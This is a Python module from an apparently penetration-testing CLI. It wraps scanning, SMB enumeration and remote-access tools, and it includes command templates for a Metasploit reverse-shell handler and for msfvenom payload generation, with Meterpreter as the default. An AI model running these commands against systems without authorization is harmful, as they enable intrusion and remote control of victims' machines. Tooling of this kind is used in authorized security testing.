import shlex
from ..core.colors import log_warn, log_error
from ..core.base_shell import ModuleShell
from .base import BaseModule
from ..core.utils import get_ip_address

class InfraModule(BaseModule):
    MODULE_NAME = "infra"
    TOOLS = {
        "nmap": {
            "cmd": "nmap -sV -sC -Pn -v {config_flags} {target}",
            "binary": "nmap",
            "desc": "Service/version scan with default scripts",
            "category": "Scanners",
            "requires": ["target"],
            "execution_mode": "captured",
            "summary_profile": "nmap",
        },
        "rustscan": {
            "cmd": "rustscan -a {target} --ulimit 5000",
            "binary": "rustscan",
            "desc": "Fast port scanner",
            "category": "Scanners",
            "requires": ["target"],
            "execution_mode": "captured",
            "summary_profile": "ports",
        },
        "smbclient": {
            "cmd": "smbclient -L //{target}/ {auth}",
            "binary": "smbclient",
            "desc": "List SMB shares",
            "category": "SMB Tools",
            "requires": ["target"],
            "auth_mode": "flag_U",
            "execution_mode": "captured",
            "summary_profile": "generic",
        },
        "smbmap": {
            "cmd": "smbmap -H {target} {auth} --no-banner -q",
            "binary": "smbmap",
            "desc": "Enumerate SMB shares and permissions",
            "category": "SMB Tools",
            "requires": ["target"],
            "auth_mode": "u_p_flags",
            "execution_mode": "captured",
            "summary_profile": "generic",
        },
        "enum4linux": {
            "cmd": "enum4linux-ng -A {auth} {target}",
            "binary": "enum4linux-ng",
            "desc": "SMB/NetBIOS enumeration",
            "category": "SMB Tools",
            "requires": ["target"],
            "auth_mode": "u_p_flags",
            "execution_mode": "captured",
            "summary_profile": "generic",
        },
        "ftp": {
            "cmd": "lftp -u '{user},{password}' ftp://{target}",
            "binary": "lftp",
            "desc": "FTP client session",
            "category": "Remote Access",
            "requires": ["target"],
            "auth_mode": "custom_ftp",
            "execution_mode": "passthrough",
        },
        "msf": {
            "cmd": "msfconsole -q -x \"use exploit/multi/handler; set payload {payload}; set LHOST {lhost}; set LPORT {lport}; set ExitOnSession false; exploit -j\"",
            "binary": "msfconsole",
            "desc": "Metasploit reverse shell handler",
            "category": "Exploitation",
            "requires": ["lport"],
            "execution_mode": "passthrough",
        },
        "msfvenom": {
            "cmd": "msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {payload_format} -o {payload_file}",
            "binary": "msfvenom",
            "desc": "Generate a Metasploit payload that matches the listener",
            "category": "Exploitation",
            "requires": ["lport"],
            "execution_mode": "passthrough",
        },
        "rdp": {
            "cmd": "xfreerdp3 /v:{target} +clipboard /dynamic-resolution /drive:share,. {auth}",
            "binary": "xfreerdp3",
            "desc": "Remote desktop connection",
            "category": "Remote Access",
            "requires": ["target"],
            "auth_mode": "rdp_flags",
            "execution_mode": "passthrough",
        },
        "ssh": {
            "cmd": "sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {user}@{target}",
            "binary": "sshpass",
            "desc": "SSH login with password",
            "category": "Remote Access",
            "requires": ["target", "auth_mandatory"],
            "auth_mode": "custom",
            "execution_mode": "passthrough",
        },
    }

    def __init__(self, session):
        super().__init__(session)

    def _resolve_lhost(self):
        lhost = self.session.get("lhost")
        if lhost:
            return lhost
        interface = self.session.get("interface")
        return get_ip_address(interface) or "0.0.0.0"

    def _resolve_payload(self):
        payload_defaults = self.session.config.get("infra", {}).get("defaults", {})
        return (
            payload_defaults.get("payload")
            or self.session.get_config_flags("infra", "msf", "payload")
            or "windows/meterpreter/reverse_tcp"
        )

    def _resolve_payload_format(self, payload):
        payload_defaults = self.session.config.get("infra", {}).get("defaults", {})
        configured_format = (
            payload_defaults.get("payload_format")
            or self.session.get_config_flags("infra", "msfvenom", "format")
        )
        if configured_format:
            return configured_format

        payload_lower = payload.lower()
        if "windows" in payload_lower:
            return "exe"
        if "linux" in payload_lower:
            return "elf"
        if "osx" in payload_lower or "macho" in payload_lower:
            return "macho"
        if "powershell" in payload_lower or "psh" in payload_lower:
            return "ps1"
        if "war" in payload_lower:
            return "war"
        if "python" in payload_lower:
            return "py"
        return "raw"

    def _resolve_payload_file(self, payload, payload_format):
        payload_file = self.session.config.get("infra", {}).get("defaults", {}).get("payload_file")
        if payload_file:
            return payload_file

        ext_map = {
            "exe": "exe",
            "elf": "elf",
            "macho": "macho",
            "raw": "bin",
            "ps1": "ps1",
            "war": "war",
            "py": "py",
            "aspx": "aspx",
            "asp": "asp",
            "jsp": "jsp",
        }
        payload_name = payload.split("/")[-1].replace("_", "-")
        extension = ext_map.get(payload_format, payload_format)
        return f"{payload_name}.{extension}"

    def run_tool(self, tool_name, copy_only=False, edit=False, preview=False, no_auth=False, no_summary=False):
        tool = self.TOOLS.get(tool_name)
        if not tool:
            log_error(f"Tool {tool_name} not found.")
            return 1

        # Check tool availability
        binary = tool.get("binary")
        if binary and not self._check_tool(binary):
            return 127

        scan_target, _, _ = self.session.resolve_host_target()
        domain_resolved, _, _ = self.session.resolve_domain_value()
        target = scan_target

        if tool_name not in ("msf", "msfvenom") and not target:
             log_warn("Target is not set. Use 'set TARGET <ip/domain>'")
             return 1

        # 1. Get Variables
        user = self.session.get("username")
        password = self.session.get("password")
        hash_val = self.session.get("hash")
        interface = self.session.get("interface")
        lport = self.session.get("lport")
        lhost = self._resolve_lhost()
        payload_name = self._resolve_payload()
        payload_format = self._resolve_payload_format(payload_name)
        payload_file = self._resolve_payload_file(payload_name, payload_format)

        # 2. Auto-enable auth if credentials are present (unless -noauth was passed)
        has_creds = bool(user and (password or hash_val))
        use_auth = has_creds and not no_auth

        # 3. Check Requirements
        reqs = tool.get("requires", [])
        if "target" in reqs and not target:
            log_warn("Target is not set.")
            return 1
        if "domain" in reqs and not domain_resolved:
            log_warn("Domain is not set. (Try 'set domain ...')")
            return 1
        if "auth_mandatory" in reqs:
            if not (user and (password or hash_val)):
                 log_warn("Credentials required for this tool. Use 'set user <username:password>'")
                 return 1

        if tool_name in ("msf", "msfvenom") and not lhost:
            log_warn("LHOST could not be resolved. Use 'set lhost <ip>' or set a valid interface.")
            return 1

        # 3. Build Auth String
        auth_str = ""
        impacket_args = ""
        
        if use_auth:
             mode = tool.get("auth_mode", "")
             if mode == "u_p_flags":
                 # -u 'user' -p 'pass'
                 if user: auth_str += f"-u {shlex.quote(user)} "
                 if password: auth_str += f"-p {shlex.quote(password)} "
             elif mode == "flag_U":
                 # smbclient -U 'user%pass' or -N
                 if user and password:
                     auth_str = f"-U {shlex.quote(user + '%' + password)}"
                 else:
                     auth_str = "-N"
             elif mode == "rdp_flags":
                 # /u:'user' /p:'pass'
                 if user: auth_str += f"/u:{shlex.quote(user)} "
                 if password: auth_str += f"/p:{shlex.quote(password)} "
             elif mode == "custom_ftp":
                 # lftp -u 'user,pass'
                 pass # Handled in format_args
             elif mode == "impacket":
                 principal = f"{domain_resolved}/{user}" if domain_resolved else user
                 if hash_val:
                     impacket_args = (
                         f"-hashes {shlex.quote(':' + hash_val)} "
                         f"{shlex.quote(f'{principal}@{target}')}"
                     )
                 elif password:
                     impacket_args = shlex.quote(f"{principal}:{password}@{target}")
                 else:
                     impacket_args = shlex.quote(f"{principal}@{target}")

        if tool.get("auth_mode") == "impacket" and not impacket_args:
            log_warn("Credentials required for this tool. Use 'set user <username:password>' or 'set hash <ntlm_hash>'.")
            return 1
        
        # 4. Get Tool Configuration Flags
        config_flags = ""
        
        # Check for tool-specific config
        if tool_name == "nmap":
            mode_flags = self.session.get_config_flags("infra", "nmap", "mode")
            if mode_flags:
                config_flags = mode_flags
        
        if tool_name == "smbclient":
            auth_config = self.session.get_config_flags("infra", "smbclient", "auth")
            if auth_config:
                # Override auth_str if config is set
                auth_str = auth_config
        
        # 5. Format Command
        try:
             # Prepare context vars with QUOTING for security
             format_args = {
                 "target": shlex.quote(target),
                 "ip": shlex.quote(self.session.get("target") or target),
                 "domain": shlex.quote(domain_resolved or ""),
                 "auth": auth_str,
                 "user": shlex.quote(user or ""),
                 "password": shlex.quote(password or ""),
                 "impacket_args": impacket_args,
                 "lport": shlex.quote(lport or "4444"),
                 "lhost": shlex.quote(lhost),
                 "payload": shlex.quote(payload_name),
                 "payload_format": shlex.quote(payload_format),
                 "payload_file": shlex.quote(payload_file),
                 "config_flags": config_flags,
             }
             
             # Special case for FTP default anonymous
             if tool_name == "ftp":
                 if not use_auth:
                     format_args["user"] = "anonymous"
                     format_args["password"] = "anonymous"
                 else:
                     format_args["user"] = shlex.quote(user or "anonymous")
                     format_args["password"] = shlex.quote(password or "anonymous")
             
             cmd = tool["cmd"].format(**format_args)
             
             # Clean up double spaces
             cmd = " ".join(cmd.split())
             
             return self._exec(
                 cmd,
                 copy_only,
                 edit,
                 preview=preview,
                 no_summary=no_summary,
                 summary_context=self._build_summary_context(tool_name, tool),
             )
             
        except KeyError as e:
            from ...core.rich_output import get_formatter
            formatter = get_formatter()
            formatter.error_panel(
                error_type="KeyError",
                message=f"Missing variable in command template: {e}",
                suggestions=[
                    "Set the required variable using 'set <variable> <value>'",
                    "Check available variables with 'options' command",
                    "Verify the tool configuration is correct"
                ]
            )
            return 1

    def run(self, args_list):
        args_list, cli_flags = self.parse_cli_options(args_list)
        tool_index, tool_name = self.find_tool_invocation(args_list)

        if tool_name and self.has_help_flag(args_list[tool_index + 1:]):
            self.print_tool_help("infra", tool_name)
            return 0

        if self.has_help_flag(args_list):
            self._print_help(
                "Infrastructure Module",
                "red -i -<tool> [options]",
                self.TOOLS,
                [
                    "red -T 10.10.10.10 -i -nmap",
                    "red -T 10.10.10.10 -U admin:pass -i -smbclient",
                    "red -T 10.10.10.10 -U admin:pass -i -ssh",
                    "red -i -P 4444 -msfvenom -p",
                    "red -i -P 4444 -msf",
                ]
            )
            return 0

        if tool_name:
            return self.run_tool(
                tool_name,
                copy_only=cli_flags["copy_only"],
                edit=cli_flags["edit"],
                preview=cli_flags["preview"],
                no_auth=cli_flags["no_auth"],
                no_summary=cli_flags["no_summary"],
            )

        log_warn("No valid tool flag found. Use interactive mode or specify -<toolname>")
        return 1


class InfraShell(ModuleShell):
    MODULE_CLASS = InfraModule
    COMMAND_CATEGORIES = {}

    def __init__(self, session):
        super().__init__(session, "infra")

    def _create_do_method(self, tool_name):
        def do_tool(arg):
            """Run tool or configure it"""
            if arg.strip() in ("-h", "--help", "help"):
                self._show_tool_help(tool_name)
                return
            if arg.strip() == "config" or arg.strip().startswith("config "):
                self._handle_tool_config(tool_name, arg.replace("config", "").strip())
                return
            _, copy_only, edit, preview, no_summary, no_auth = self.parse_common_options(arg)
            self.module.run_tool(tool_name, copy_only, edit, preview, no_auth, no_summary)
        do_tool.__doc__ = f"Run {tool_name} or use '{tool_name} config' to configure"
        do_tool.__name__ = f"do_{tool_name}"
        return do_tool

    def _handle_tool_config(self, tool_name, config_arg):
        """Handle configuration for a specific tool"""
        from ..core.colors import Colors, log_warn, log_error
        
        # Get available configs for this tool
        tool_configs = self.session.config.get("infra", {}).get("configs", {}).get(tool_name, {})
        
        if not tool_configs:
            log_warn(f"No configuration options available for {tool_name}")
            return
        
        # If no argument, show available configs
        if not config_arg:
            print(f"\n{Colors.HEADER}{tool_name} Configuration Options{Colors.ENDC}")
            print("=" * 60)
            for key, options in tool_configs.items():
                print(f"\n{Colors.BOLD}{key}:{Colors.ENDC}")
                for opt_name, opt_value in options.items():
                    current = self.session.get_tool_config("infra", tool_name, key)
                    marker = " *" if current == opt_name else ""
                    print(f"  {opt_name:<15} {opt_value}{marker}")
            print(f"\nUsage: {tool_name} config <key>=<value>")
            print(f"Example: {tool_name} config mode=udp")
            print()
            return
        
        # Parse key=value format
        if "=" not in config_arg:
            log_error(f"Usage: {tool_name} config <key>=<value>")
            return
        
        key, value = config_arg.split("=", 1)
        key = key.strip()
        value = value.strip()
        
        # Validate and set
        if key not in tool_configs:
            log_error(f"Unknown config key '{key}' for {tool_name}")
            return
        
        if value not in tool_configs[key]:
            log_error(f"Unknown value '{value}' for {tool_name}.{key}")
            print(f"Valid values: {', '.join(tool_configs[key].keys())}")
            return
        
        self.session.set_tool_config("infra", tool_name, key, value)
